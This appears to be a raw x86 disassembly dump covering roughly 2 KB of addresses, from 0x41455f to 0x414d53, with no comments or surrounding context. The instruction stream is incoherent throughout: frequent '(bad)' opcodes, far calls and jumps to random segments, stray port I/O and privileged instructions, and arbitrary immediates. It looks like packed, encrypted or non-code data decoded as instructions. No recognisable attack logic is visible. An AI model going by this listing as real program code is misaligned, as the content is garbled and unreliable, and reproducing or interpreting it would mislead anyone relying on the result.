  41455f:	and    BYTE PTR [ebp+0x6d079aa7],ah
  414565:	addr16 (bad) 
  414567:	jp     0x414542
  414569:	loop   0x414528
  41456b:	je     0x414527
  41456d:	idiv   BYTE PTR [ebx+esi*8-0x35]
  414571:	rcl    DWORD PTR [ebx+0x74ee2a75],cl
  414577:	mov    cl,0xf1
  414579:	je     0x4145af
  41457b:	repz (bad) [ecx-0x5c77beee]
  414582:	loope  0x414560
  414584:	xor    BYTE PTR ds:0x623db038,bl
  41458a:	pusha  
  41458b:	repnz rol BYTE PTR [edi],0x17
  41458f:	xchg   ebx,eax
  414590:	test   DWORD PTR ss:[ebp+0x4d60f063],edx
  414597:	mov    ecx,0xcaeefed8
  41459c:	shl    DWORD PTR [ecx+esi*1+0x67d22115],1
  4145a3:	sub    al,0x47
  4145a5:	pop    ebp
  4145a6:	push   edi
  4145a7:	shl    DWORD PTR [ebx],cl
  4145a9:	scas   al,BYTE PTR es:[edi]
  4145aa:	jnp    0x4145da
  4145ac:	loop   0x41462c
  4145ae:	mov    esi,0xb03d255a
  4145b3:	cmc    
  4145b4:	adc    al,0xfa
  4145b6:	retf   0x7df1
  4145b9:	sub    eax,0x4a868307
  4145be:	dec    esp
  4145bf:	shl    dl,1
  4145c1:	inc    edi
  4145c2:	xchg   edi,eax
  4145c3:	es ja  0x4145f3
  4145c6:	int    0x29
  4145c8:	mov    dl,0x7d
  4145ca:	idiv   dh
  4145cc:	pop    esp
  4145cd:	mov    ?,WORD PTR [eax-0x37]
  4145d0:	and    dh,BYTE PTR [ecx+0x63]
  4145d3:	mov    esi,0x2d613bd5
  4145d8:	xor    BYTE PTR [edi],0x4c
  4145db:	pop    ecx
  4145dc:	jbe    0x41461f
  4145de:	push   edi
  4145df:	in     al,0x6
  4145e1:	inc    eax
  4145e2:	out    0x1a,al
  4145e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145e5:	pop    ebp
  4145e6:	mov    al,BYTE PTR [esi]
  4145e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e9:	pop    ebp
  4145ea:	dec    ebp
  4145eb:	sub    DWORD PTR [eax-0x2b1e9b5],edi
  4145f1:	add    BYTE PTR [ebp-0x7c],0x9e
  4145f5:	jmp    0x4145ce
  4145f7:	xor    al,0x14
  4145f9:	out    0xb0,eax
  4145fb:	mov    dh,0x3c
  4145fd:	popa   
  4145fe:	sbb    DWORD PTR [eax-0x2d],esi
  414601:	cmp    esp,ebp
  414603:	shl    DWORD PTR [eax],1
  414605:	sbb    al,0xf1
  414607:	call   0x166c1674
  41460c:	push   gs
  41460e:	addr16 push ds
  414610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414611:	aas    
  414612:	jo     0x4145a4
  414614:	mov    bl,0x50
  414616:	std    
  414617:	sub    eax,0x7eafc13a
  41461c:	pushf  
  41461d:	xchg   ecx,eax
  41461e:	jmp    0x4145a7
  414620:	xchg   ecx,eax
  414621:	stc    
  414622:	and    DWORD PTR [edx+0x5a],edi
  414625:	jns    0x41463f
  414627:	sbb    eax,0xd9967b8b
  41462c:	dec    eax
  41462d:	call   0xc2fe:0x966eb60c
  414634:	das    
  414635:	(bad)  
  414636:	stc    
  414637:	mov    ch,0x69
  414639:	sbb    DWORD PTR [ebp-0x1fb1900d],ebp
  41463f:	sbb    eax,0xf9c60a76
  414644:	sub    DWORD PTR [ebp-0x4f],ecx
  414647:	push   ebp
  414648:	jb     0x41464a
  41464a:	mov    eax,0x65c7aa42
  41464f:	ss and edx,esi
  414652:	sbb    bl,BYTE PTR [ebp-0x2fa21c37]
  414658:	aaa    
  414659:	add    cl,cl
  41465b:	xchg   edx,eax
  41465c:	jge    0x414682
  41465e:	mov    esp,0x97fe238f
  414663:	lds    ecx,FWORD PTR [eax]
  414665:	mov    al,ds:0x19cd7c0a
  41466a:	(bad)  
  41466b:	ja     0x4146bf
  41466d:	push   esp
  41466e:	(bad)  
  41466f:	in     eax,0x7e
  414671:	cmp    DWORD PTR [edx-0x40],0xffffff8a
  414675:	jge    0x41463a
  414677:	lods   al,BYTE PTR ds:[esi]
  414678:	push   ebp
  414679:	jecxz  0x4145fc
  41467b:	mov    edx,0x155468df
  414680:	aam    0xf4
  414682:	pop    es
  414683:	pop    esp
  414684:	sbb    esi,DWORD PTR [edi-0x6d]
  414687:	push   cs
  414688:	push   ss
  414689:	inc    edi
  41468a:	les    edi,FWORD PTR [ebp-0x4b]
  41468d:	jg     0x4146a5
  41468f:	cmp    eax,0xcc92d4f8
  414694:	and    BYTE PTR [esi+0x433a3cc8],0xfc
  41469b:	loope  0x41464c
  41469d:	sub    eax,0x363637c8
  4146a2:	jg     0x4146b8
  4146a4:	mov    dl,BYTE PTR [ecx+ecx*1+0xb75bd05]
  4146ab:	bound  edi,QWORD PTR [edx+0x50]
  4146ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146af:	jnp    0x4146cd
  4146b1:	mov    edi,0xa2f32f85
  4146b6:	inc    edx
  4146b7:	(bad)  
  4146b8:	(bad)  
  4146b9:	ins    BYTE PTR es:[edi],dx
  4146ba:	and    dl,bl
  4146bc:	inc    eax
  4146bd:	fild   WORD PTR [esi-0x2843ac5e]
  4146c3:	and    eax,0x270c4236
  4146c8:	jecxz  0x41464a
  4146ca:	add    esi,DWORD PTR [edx]
  4146cc:	int3   
  4146cd:	and    BYTE PTR [eax],0x2c
  4146d0:	fucom  st(1)
  4146d2:	add    DWORD PTR [eax+0x3c53224],edi
  4146d8:	rol    esi,0x7f
  4146db:	fisub  DWORD PTR [eax-0x1e90603]
  4146e1:	mov    eax,0x7ca13546
  4146e6:	jle    0x414703
  4146e8:	fimul  WORD PTR [ebx+0x49]
  4146eb:	mov    edi,0x78f21a4a
  4146f0:	test   al,0xa5
  4146f2:	mov    eax,ds:0x7e0654b3
  4146f7:	inc    edi
  4146f8:	push   edx
  4146f9:	lods   eax,DWORD PTR ds:[esi]
  4146fa:	cwde   
  4146fb:	jmp    0xc877:0x880351ff
  414702:	and    bh,BYTE PTR [ecx+0x67]
  414705:	and    eax,0x1f0f20b2
  41470a:	es jg  0x414703
  41470d:	jnp    0x41476d
  41470f:	rcl    DWORD PTR [ebp+0x1c479648],cl
  414715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414716:	inc    ebp
  414717:	sub    al,0x8c
  414719:	push   edi
  41471a:	pop    ecx
  41471b:	push   edi
  41471c:	push   ds
  41471d:	loop   0x414789
  41471f:	xchg   BYTE PTR [ecx],dh
  414721:	ret    
  414722:	nop
  414723:	(bad)
  414727:	out    0x7a,eax
  414729:	and    al,0x75
  41472b:	enter  0x967a,0xe7
  41472f:	lock outs dx,BYTE PTR ds:[esi]
  414731:	jg     0x4146dc
  414733:	inc    edi
  414734:	sub    BYTE PTR ds:0x94e55d08,al
  41473a:	add    al,dh
  41473c:	mov    dl,0x5f
  41473e:	aam    0xa8
  414740:	inc    ebp
  414741:	mov    bl,BYTE PTR [ecx+edi*4+0x5bf37dda]
  414748:	je     0x414768
  41474a:	or     ebx,0xb
  41474d:	lea    edx,[ebx]
  41474f:	rol    DWORD PTR [ebp-0x621ae206],0xdc
  414756:	push   ebx
  414757:	pushf  
  414758:	cwde   
  414759:	je     0x414797
  41475b:	push   ds
  41475c:	dec    esi
  41475d:	pop    ds
  41475e:	daa    
  41475f:	and    bl,BYTE PTR [esi+ebp*1+0x2e]
  414763:	pop    ds
  414764:	mov    DWORD PTR ds:0xd95f9831,esi
  41476a:	jbe    0x4147e8
  41476c:	inc    ebx
  41476d:	adc    edi,DWORD PTR [ebp+0x79]
  414770:	dec    eax
  414771:	push   esi
  414772:	jb     0x4147ca
  414774:	sbb    cl,BYTE PTR [edx+eiz*8]
  414777:	or     dh,BYTE PTR [eax+0x4b]
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	adc    edi,DWORD PTR [edx+ebx*8-0xe8499b7]
  414782:	cmp    edx,DWORD PTR [eax+0x63]
  414785:	loope  0x4147de
  414787:	ret    
  414788:	mov    bl,dh
  41478a:	jmp    0xbaa9c3f6
  41478f:	push   es
  414790:	adc    ah,bl
  414792:	jle    0x41471a
  414794:	xchg   ebp,eax
  414795:	and    ebx,DWORD PTR [ecx+0x17]
  414798:	pop    ss
  414799:	leave  
  41479a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41479b:	outs   dx,BYTE PTR ds:[esi]
  41479c:	jo     0x4147b5
  41479e:	out    dx,eax
  41479f:	repz (bad) 
  4147a1:	xchg   DWORD PTR [ebx-0x1c],ebp
  4147a4:	imul   eax,DWORD PTR [ecx],0xffffffaf
  4147a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147a8:	and    edi,ecx
  4147aa:	hlt    
  4147ab:	push   edi
  4147ac:	jge    0x4147e5
  4147ae:	dec    esp
  4147af:	loopne 0x4147f2
  4147b1:	out    dx,eax
  4147b2:	cmp    eax,esi
  4147b4:	add    ebp,DWORD PTR [ebp+0x71d4bf09]
  4147ba:	aam    0xfc
  4147bc:	(bad)  
  4147bf:	js     0x4147f8
  4147c1:	shl    bh,0xbe
  4147c4:	mov    DWORD PTR [esi+0x6e1e4847],0x51038a0a
  4147ce:	fcmovnbe st,st(1)
  4147d0:	outs   dx,DWORD PTR ds:[esi]
  4147d1:	xchg   edx,eax
  4147d2:	jmp    0xaabc:0xdd089834
  4147d9:	jle    0x4147cf
  4147db:	and    eax,0x7392d36d
  4147e0:	add    DWORD PTR [edx],ebx
  4147e2:	cld    
  4147e3:	push   0x70
  4147e5:	lods   al,BYTE PTR ds:[esi]
  4147e6:	cld    
  4147e7:	xchg   esi,eax
  4147e8:	ins    DWORD PTR es:[edi],dx
  4147e9:	in     al,0x57
  4147eb:	arpl   bx,bx
  4147ed:	mov    edx,DWORD PTR [edi+ebp*8-0x4d]
  4147f1:	or     eax,0xc7168652
  4147f6:	sahf   
  4147f7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4147f9:	xchg   ebx,eax
  4147fa:	mov    dh,0x60
  4147fc:	xchg   esp,eax
  4147fd:	fs mov ah,0x29
  414800:	cld    
  414801:	xchg   ebx,eax
  414802:	sbb    al,0x78
  414804:	jne    0x4147a9
  414806:	ins    DWORD PTR es:[edi],dx
  414807:	inc    ebp
  414808:	scas   al,BYTE PTR es:[edi]
  414809:	xor    DWORD PTR [ebx+0x72d70625],eax
  41480f:	mov    esi,0xef123bcf
  414814:	lods   al,BYTE PTR ds:[esi]
  414815:	cmp    ebx,esp
  414817:	(bad)  
  414818:	in     eax,0xf1
  41481a:	mov    ch,0xd0
  41481c:	push   0xeec42b62
  414821:	and    bh,cl
  414823:	xchg   DWORD PTR [eax-0x80],eax
  414826:	add    al,cl
  414828:	adc    ecx,DWORD PTR [eax+0x3a1339d]
  41482e:	xchg   ebp,ecx
  414830:	cwde   
  414831:	pop    ebx
  414832:	jp     0x414836
  414834:	(bad)  
  414835:	call   0x8d2e:0x2b076669
  41483c:	ret    
  41483d:	jmp    0x6aeb511d
  414842:	idiv   DWORD PTR [esi+0x73fe10d4]
  414848:	(bad)  
  414849:	mov    eax,0x9a2d3766
  41484e:	loopne 0x4148cf
  414850:	push   ss
  414851:	xchg   edx,eax
  414852:	mov    eax,0x4b2505a
  414857:	push   edx
  414858:	jb     0x41488e
  41485a:	test   eax,0xddcc53b
  41485f:	mov    ebx,0x274696f1
  414864:	out    dx,eax
  414865:	inc    edi
  414866:	int3   
  414867:	dec    edi
  414868:	sti    
  414869:	js     0x414802
  41486b:	and    ch,dh
  41486d:	rol    DWORD PTR [eax+ebp*8],1
  414870:	inc    ecx
  414871:	lods   eax,DWORD PTR ds:[esi]
  414872:	in     al,0x24
  414874:	sbb    eax,DWORD PTR [ecx]
  414876:	pop    esi
  414877:	call   0xe22:0x402d97b9
  41487e:	cmp    eax,0x43b5b5f5
  414883:	call   0xf862:0x8daf9570
  41488a:	inc    esp
  41488b:	mov    ?,ebx
  41488d:	adc    eax,DWORD PTR [edx]
  41488f:	xor    cl,BYTE PTR [ebx]
  414891:	adc    al,0x2b
  414893:	call   0xbcd3:0xabeb45d3
  41489a:	enter  0x263a,0xfb
  41489e:	das    
  41489f:	sbb    al,0xf5
  4148a1:	dec    BYTE PTR [edx-0x35]
  4148a4:	call   0x3d3cc245
  4148a9:	sub    dl,cl
  4148ab:	sub    eax,0x14ee5e33
  4148b0:	ds int 0x22
  4148b3:	in     eax,0xcd
  4148b5:	sbb    eax,0xb23405de
  4148ba:	mov    ebp,0xc7704719
  4148bf:	add    eax,edi
  4148c1:	xchg   esi,eax
  4148c2:	mov    esi,0x409235f5
  4148c7:	xchg   edx,eax
  4148c8:	in     eax,dx
  4148c9:	pop    ecx
  4148ca:	ja     0x5ebc4de0
  4148d0:	mov    eax,ds:0x19f482cd
  4148d5:	idiv   BYTE PTR [edi+0x5b]
  4148d8:	shl    al,1
  4148da:	out    0x1f,al
  4148dc:	(bad)  
  4148dd:	test   DWORD PTR [ecx+ebx*8-0x53adcf3e],ebx
  4148e4:	add    ch,bh
  4148e6:	mov    edi,0xe65ded81
  4148eb:	sahf   
  4148ec:	push   edi
  4148ed:	xor    ah,dh
  4148ef:	mov    dl,0xdc
  4148f1:	in     eax,0x99
  4148f3:	mov    BYTE PTR [ebp+0x9f80bf2],dl
  4148f9:	jns    0x41491f
  4148fb:	dec    ebp
  4148fc:	js     0x4148a3
  4148fe:	std    
  4148ff:	push   ds
  414900:	mov    ebp,0x8bbd971
  414905:	ret    
  414906:	and    bh,0x8a
  414909:	push   ds
  41490a:	mov    DWORD PTR [edi+0x44],ebx
  41490d:	(bad)  
  41490e:	into   
  41490f:	lock xor dh,dh
  414912:	icebp  
  414913:	ins    DWORD PTR es:[edi],dx
  414914:	xchg   esi,eax
  414915:	mov    edx,0x6c970dfd
  41491a:	lock xchg ebx,eax
  41491c:	shr    BYTE PTR [edi-0x2c],0xfb
  414920:	outs   dx,BYTE PTR ds:[esi]
  414921:	mov    bh,0xdf
  414923:	jmp    0x8c61a249
  414928:	mov    ecx,0xba4716c1
  41492d:	and    eax,0x9a9392ce
  414932:	lock mov eax,ds:0x8dcac6d
  414938:	mov    bl,0xd2
  41493a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493b:	xor    DWORD PTR [edx-0x13a8885],0x31fbdcaa
  414945:	fsub   DWORD PTR [esi]
  414947:	into   
  414948:	jmp    0xca09:0xb39715a2
  41494f:	inc    ebp
  414950:	ret    0xb991
  414953:	shl    BYTE PTR [esi],0x56
  414956:	pushf  
  414957:	jge    0x4149aa
  414959:	adc    ecx,DWORD PTR [edx]
  41495b:	sbb    bl,BYTE PTR [ebp-0x5bc52275]
  414961:	rcl    DWORD PTR [edi+0x15436a31],0x1c
  414968:	loop   0x4149de
  41496a:	ret    
  41496b:	jge    0x4148f1
  41496d:	ins    BYTE PTR es:[edi],dx
  41496e:	cdq    
  41496f:	test   eax,0xccdf8c8b
  414974:	icebp  
  414975:	retf   0xd33b
  414978:	loopne 0x414919
  41497a:	ret    
  41497b:	dec    eax
  41497c:	dec    ebp
  41497d:	sub    al,0x33
  41497f:	sbb    BYTE PTR ds:0x2a57345b,bl
  414985:	fcomip st,st(0)
  414987:	test   dh,bl
  414989:	jb     0x414969
  41498b:	jb     0x4149ce
  41498d:	pop    edi
  41498e:	jmp    0x4149f2
  414990:	jl     0x41491f
  414992:	sub    al,0xf6
  414994:	pop    edx
  414995:	add    edi,0x64a20629
  41499b:	dec    esp
  41499c:	and    al,0xa4
  41499e:	outs   dx,BYTE PTR ds:[esi]
  41499f:	ret    
  4149a0:	nop
  4149a1:	les    esi,FWORD PTR [eax-0x17]
  4149a4:	sub    esi,esi
  4149a6:	pop    edx
  4149a8:	rcr    BYTE PTR [esi-0x53],0xad
  4149ac:	adc    edi,esi
  4149ae:	pop    ss
  4149af:	xchg   edi,eax
  4149b0:	inc    esi
  4149b1:	dec    ecx
  4149b2:	in     al,dx
  4149b3:	jae    0x4149b3
  4149b5:	mov    ah,0x92
  4149b7:	hlt    
  4149b8:	and    esi,DWORD PTR ds:0x6b7c8b15
  4149be:	jg     0x414a3c
  4149c0:	jmp    0xa1fc646
  4149c5:	sub    DWORD PTR [esi+0x11e7f68c],0xd322f6cf
  4149cf:	add    ecx,DWORD PTR [esi+0x7b29f1bf]
  4149d5:	and    DWORD PTR [edi],0xf1477604
  4149db:	inc    ebx
  4149dc:	jge    0x414a34
  4149de:	inc    edx
  4149df:	cs sbb al,0x6e
  4149e2:	leave  
  4149e3:	xchg   esi,eax
  4149e4:	add    dh,dl
  4149e6:	cwde   
  4149e7:	mov    esp,0x3d367655
  4149ec:	pushf  
  4149ed:	in     eax,0xc5
  4149ef:	out    dx,eax
  4149f0:	leave  
  4149f1:	mov    cl,0x69
  4149f3:	adc    al,0x2e
  4149f5:	jle    0x4149b4
  4149f7:	or     BYTE PTR [esp+edx*4-0x4cac3a1e],ah
  4149fe:	arpl   WORD PTR [ebx+0xf0cac60],si
  414a04:	jns    0x414990
  414a06:	mov    ecx,0x729cb5cb
  414a0b:	adc    dh,cl
  414a0d:	scas   al,BYTE PTR es:[edi]
  414a0e:	push   ebx
  414a0f:	aad    0x99
  414a11:	and    DWORD PTR [ebx],esp
  414a13:	mov    esp,0xd6b7d358
  414a18:	nop
  414a19:	adc    ch,BYTE PTR [edi+0x54]
  414a1c:	or     al,0x2a
  414a1e:	jnp    0x414a1e
  414a20:	inc    esi
  414a21:	aad    0x1c
  414a23:	inc    eax
  414a24:	push   cs
  414a25:	mov    al,ds:0x8027bb04
  414a2a:	sahf   
  414a2b:	sbb    DWORD PTR [eax-0x18878867],ecx
  414a31:	adc    eax,0xa8fac343
  414a36:	jne    0x4149c6
  414a38:	xchg   ecx,eax
  414a39:	pushf  
  414a3a:	daa    
  414a3b:	pop    es
  414a3c:	xchg   esp,eax
  414a3d:	inc    esp
  414a3e:	fnsave [eax]
  414a40:	jo     0x414aa8
  414a42:	mov    esi,0x26e8dad7
  414a47:	mul    ebx
  414a49:	push   0x34fc4c9c
  414a4e:	lods   eax,DWORD PTR ds:[esi]
  414a4f:	dec    ecx
  414a50:	cmp    edi,edi
  414a52:	loop   0x414a8c
  414a54:	jnp    0x414ac7
  414a56:	out    0xe,eax
  414a58:	mov    ds,esi
  414a5a:	mov    bl,0xad
  414a5c:	mov    esi,0xe6cfbdfa
  414a61:	aas    
  414a62:	sbb    eax,0x8dec2bee
  414a67:	out    dx,eax
  414a68:	mov    eax,ds:0xd655406a
  414a6d:	pop    ds
  414a6e:	ins    BYTE PTR es:[edi],dx
  414a6f:	sbb    BYTE PTR [eax-0x7],al
  414a72:	dec    edi
  414a73:	mov    edx,0x96054df4
  414a78:	jo     0x414a6d
  414a7a:	add    DWORD PTR [ecx+0x3b97c622],ebx
  414a80:	neg    BYTE PTR [ebx+0x51]
  414a83:	inc    esi
  414a84:	xchg   edi,eax
  414a85:	sbb    cl,BYTE PTR [esi+0x714571b6]
  414a8b:	adc    al,0x11
  414a8d:	xchg   BYTE PTR [ecx+0x74],bh
  414a90:	sbb    dh,BYTE PTR [edx+0x30063d94]
  414a96:	int    0x7a
  414a98:	dec    edi
  414a99:	(bad)  
  414a9a:	jle    0x414aea
  414a9c:	mov    dl,0x5
  414a9e:	ins    DWORD PTR es:[edi],dx
  414a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa0:	cmovg  ebx,esi
  414aa3:	dec    ebx
  414aa4:	sub    ecx,DWORD PTR [edi-0x229ce3da]
  414aaa:	inc    ebp
  414aab:	(bad)  
  414aac:	in     al,dx
  414aad:	sub    DWORD PTR [ebp-0x2e],eax
  414ab0:	(bad)  
  414ab1:	in     eax,0x1d
  414ab3:	mov    cl,0x98
  414ab5:	cbw    
  414ab7:	shl    esp,0xd2
  414aba:	xchg   esi,eax
  414abb:	and    dh,BYTE PTR [eax-0x11]
  414abe:	dec    edx
  414abf:	fbld   TBYTE PTR [ecx]
  414ac1:	repnz push 0xffffff98
  414ac4:	pop    ds
  414ac5:	jno    0x414a89
  414ac7:	js     0x414ac0
  414ac9:	jo     0x414abf
  414acb:	mov    esp,0x216c04e
  414ad0:	jecxz  0x414b18
  414ad2:	js     0x414a9c
  414ad4:	cmp    BYTE PTR [ebx+0x44],al
  414ad7:	xchg   esi,eax
  414ad8:	popa   
  414ad9:	test   bh,al
  414adb:	cmp    cl,BYTE PTR [eax-0x7d5103ab]
  414ae1:	test   DWORD PTR ds:0x831bd7f9,0x7dfb35bf
  414aeb:	add    bh,BYTE PTR [ebp+0x3d]
  414aee:	mov    bh,0x79
  414af0:	pop    ecx
  414af1:	and    DWORD PTR [ebp+0x18bc4e13],ecx
  414af7:	test   eax,0x7844431e
  414afc:	imul   ebx,eax,0x591f57b5
  414b02:	and    esp,0xfffffff0
  414b05:	ja     0x414a9b
  414b07:	xor    BYTE PTR [ebx],cl
  414b09:	push   ebx
  414b0a:	push   esp
  414b0b:	retf   
  414b0c:	push   cs
  414b0d:	lock adc al,BYTE PTR [edx]
  414b10:	cli    
  414b11:	ins    BYTE PTR es:[edi],dx
  414b12:	fwait
  414b13:	mov    cl,0xca
  414b15:	cdq    
  414b16:	scas   eax,DWORD PTR es:[edi]
  414b17:	sar    DWORD PTR [ebp+edi*1+0x8a05de2],0x40
  414b1f:	mov    ch,0xdc
  414b21:	and    al,0xad
  414b23:	outs   dx,DWORD PTR ds:[esi]
  414b24:	mov    esi,0xb29cca77
  414b29:	inc    esp
  414b2a:	jg     0x414afa
  414b2c:	rol    edx,1
  414b2e:	mov    ebx,esp
  414b30:	je     0x414aed
  414b32:	pushf  
  414b33:	pushf  
  414b34:	push   cs
  414b35:	clc    
  414b36:	ret    0x381
  414b39:	shl    DWORD PTR [ecx-0x255b8869],cl
  414b3f:	xchg   DWORD PTR [esi+0x7acbff49],ecx
  414b45:	push   eax
  414b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b47:	adc    ah,0xae
  414b4a:	pop    ds
  414b4b:	mov    WORD PTR [edx-0x4116dc3c],?
  414b51:	adc    esi,eax
  414b53:	jmp    0x37e7:0x819dc41a
  414b5a:	adc    dh,bl
  414b5c:	clc    
  414b5d:	xchg   DWORD PTR [edi+0x22d32712],eax
  414b63:	xchg   edx,eax
  414b64:	ins    BYTE PTR es:[edi],dx
  414b65:	(bad)  
  414b66:	push   ss
  414b67:	test   BYTE PTR [edx-0x64],cl
  414b6a:	mov    bh,0xe9
  414b6c:	xor    BYTE PTR [esi+0x1ba5b6ed],ch
  414b72:	and    ch,ah
  414b74:	pop    edx
  414b75:	popa   
  414b76:	add    eax,0xb46e2a6d
  414b7b:	dec    esp
  414b7c:	gs je  0x414b83
  414b7f:	js     0x414b2a
  414b81:	nop
  414b82:	jb     0x414b2c
  414b84:	test   BYTE PTR [eax*2-0xed87d31],bl
  414b8b:	je     0x414bf3
  414b8d:	xor    esp,DWORD PTR [eax+0x32116796]
  414b93:	jae    0x414b80
  414b95:	push   ss
  414b96:	fbstp  TBYTE PTR [ecx+0x4d3cbb3c]
  414b9c:	aas    
  414b9d:	lds    esp,FWORD PTR [edi+0x1e]
  414ba0:	dec    edi
  414ba1:	jge    0x414b48
  414ba3:	addr16 into 
  414ba5:	pop    edi
  414ba6:	mov    ds:0xfe4d29d1,al
  414bab:	or     cl,al
  414bad:	dec    edx
  414bae:	lea    edi,[edx]
  414bb0:	(bad)  
  414bb1:	retf   0xb503
  414bb4:	jbe    0x414bfa
  414bb6:	sbb    edx,DWORD PTR [edx]
  414bb8:	xchg   BYTE PTR [edi-0x4c61b748],cl
  414bbe:	mov    cl,0x48
  414bc0:	push   0xffffff9a
  414bc2:	jp     0x414bc7
  414bc4:	and    ah,bh
  414bc6:	test   DWORD PTR [edi+0x2b0846ab],edx
  414bcc:	(bad)  
  414bcd:	ficomp WORD PTR [esi-0x22]
  414bd0:	mov    bl,0xa4
  414bd2:	idiv   DWORD PTR [ecx+0x43e500dd]
  414bd8:	sahf   
  414bd9:	mov    ds:0xb4480c1c,eax
  414bde:	jne    0x414c49
  414be0:	push   es
  414be1:	outs   dx,DWORD PTR ds:[esi]
  414be2:	(bad)
  414be6:	inc    eax
  414be7:	fs add ebx,esi
  414bea:	lahf   
  414beb:	stos   DWORD PTR es:[edi],eax
  414bec:	xor    al,0xaa
  414bee:	imul   BYTE PTR ds:0x1f3e6d48
  414bf4:	or     ecx,edi
  414bf6:	xor    BYTE PTR [edi-0x43],ah
  414bf9:	mov    edx,0x2ad33ab6
  414bfe:	cmp    bl,bl
  414c00:	jo     0x414bd9
  414c02:	retf   0x95ab
  414c05:	retf   
  414c06:	sbb    ecx,DWORD PTR [ecx+0x4667fdf7]
  414c0c:	mov    ebx,0xbaeac8c2
  414c11:	aad    0x16
  414c13:	push   esp
  414c14:	in     al,dx
  414c15:	mov    eax,ds:0x5329082e
  414c1a:	scas   eax,DWORD PTR es:[edi]
  414c1b:	ret    0x75bd
  414c1e:	sbb    BYTE PTR [edx],ah
  414c20:	xor    eax,0x1baf13c9
  414c25:	loopne 0x414bc6
  414c27:	dec    esp
  414c28:	push   ds
  414c29:	push   0x4fcef6e1
  414c2e:	mov    dl,al
  414c30:	lock jl 0x414bbc
  414c33:	or     dh,BYTE PTR ds:0x495b6c71
  414c39:	xor    ah,BYTE PTR [edx-0xd]
  414c3c:	in     eax,dx
  414c3d:	test   ch,0x2d
  414c40:	ds jecxz 0x414c73
  414c43:	imul   DWORD PTR ds:0x237da73f
  414c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c4a:	gs (bad) 
  414c4c:	pop    esi
  414c4d:	adc    bh,bl
  414c4f:	push   esi
  414c50:	lods   eax,DWORD PTR ds:[esi]
  414c51:	xor    dh,BYTE PTR [ebp+0xbaf9b68]
  414c57:	inc    esp
  414c58:	loopne 0x414c68
  414c5a:	mov    ds:0xe3221119,eax
  414c5f:	call   DWORD PTR [ecx-0x6dadb5b6]
  414c65:	pop    esp
  414c66:	fs pusha 
  414c68:	(bad)  [eax+edi*4]
  414c6b:	xchg   edx,eax
  414c6c:	pop    ebp
  414c6d:	xor    al,0x1d
  414c6f:	lods   al,BYTE PTR ds:[esi]
  414c70:	sqrtps xmm2,XMMWORD PTR [esi+ecx*4-0xb]
  414c75:	js     0x414cf0
  414c77:	mov    dl,0x56
  414c79:	mov    al,ds:0xc9b4eaf0
  414c7e:	adc    al,0x63
  414c80:	sahf   
  414c81:	lods   al,BYTE PTR ds:[esi]
  414c82:	pushf  
  414c83:	cmp    bh,BYTE PTR [eax-0x7dc7c6c4]
  414c89:	and    BYTE PTR [edx+0x7a8e99ea],0x4b
  414c90:	jnp    0x414c4e
  414c92:	clc    
  414c93:	jl     0x414c97
  414c95:	test   DWORD PTR [eax+0x787bf633],0xfac2a866
  414c9f:	mov    bl,0x5f
  414ca1:	or     cl,BYTE PTR [ecx-0x2e]
  414ca4:	inc    ecx
  414ca5:	ror    esp,cl
  414ca7:	jbe    0x414d04
  414ca9:	push   ebx
  414caa:	sub    DWORD PTR [eax],0xffffffdc
  414cad:	mov    al,ds:0x8ef20b1c
  414cb2:	dec    edx
  414cb3:	aaa    
  414cb4:	fprem  
  414cb6:	aaa    
  414cb7:	das    
  414cb8:	mov    ds:0xb1bb44ff,al
  414cbd:	loope  0x414c9b
  414cbf:	pop    edx
  414cc0:	std    
  414cc1:	xchg   BYTE PTR [edx-0x19e332f5],ah
  414cc7:	jae    0x414c67
  414cc9:	je     0x414c9e
  414ccb:	xor    al,0x2d
  414ccd:	sahf   
  414cce:	mov    ch,0xf0
  414cd0:	cli    
  414cd1:	adc    al,0xc5
  414cd3:	jo     0x414c92
  414cd5:	js     0x414ce8
  414cd7:	mov    WORD PTR [eax],ss
  414cd9:	jge    0x414c5c
  414cdb:	enter  0x41a0,0x4e
  414cdf:	jge    0x414cf8
  414ce1:	jmp    0x893f:0x44c12886
  414ce8:	loopne 0x414d0f
  414cea:	(bad)  
  414ceb:	mov    ds:0x3e389f45,eax
  414cf0:	xor    DWORD PTR [ebp+0x3911ddd2],0xfffffff4
  414cf7:	shl    BYTE PTR [edx+0x106a170e],1
  414cfd:	push   cs
  414cfe:	push   ecx
  414cff:	jae    0x414d27
  414d01:	fwait
  414d02:	cmp    BYTE PTR [eax-0x70],0x4e
  414d06:	out    0x23,eax
  414d08:	xor    al,0x74
  414d0a:	or     al,0x88
  414d0c:	add    dh,BYTE PTR [edi+edx*2]
  414d0f:	in     al,dx
  414d10:	mov    cs,edx
  414d12:	ja     0x414d58
  414d14:	jp     0x414d5c
  414d16:	sbb    DWORD PTR [eax+edi*4-0x20],ebx
  414d1a:	dec    edx
  414d1b:	mov    edi,0x9a2b95f5
  414d20:	dec    edi
  414d21:	adc    eax,0x94e4f5b4
  414d26:	xlat   BYTE PTR ds:[ebx]
  414d27:	and    BYTE PTR [eax],al
  414d29:	les    ecx,FWORD PTR [edx]
  414d2b:	int    0x1d
  414d2d:	outs   dx,DWORD PTR ds:[esi]
  414d2e:	and    edi,DWORD PTR [esi]
  414d30:	dec    ebp
  414d31:	xor    bh,ah
  414d33:	dec    ebp
  414d34:	(bad)  
  414d35:	ss mov dl,0x70
  414d38:	ret    
  414d39:	mov    edi,0xfacba63e
  414d3e:	sbb    eax,0xcab3ed03
  414d43:	loop   0x414d8e
  414d45:	inc    ebx
  414d46:	adc    eax,0x6fff636b
  414d4b:	out    0x8e,eax
  414d4d:	pop    ss
  414d4e:	and    dh,BYTE PTR [ecx]
  414d50:	cdq    
  414d51:	jbe    0x414db6
  414d53:	sub    BYTE PTR [eax+edi*2-0x2c],0x61
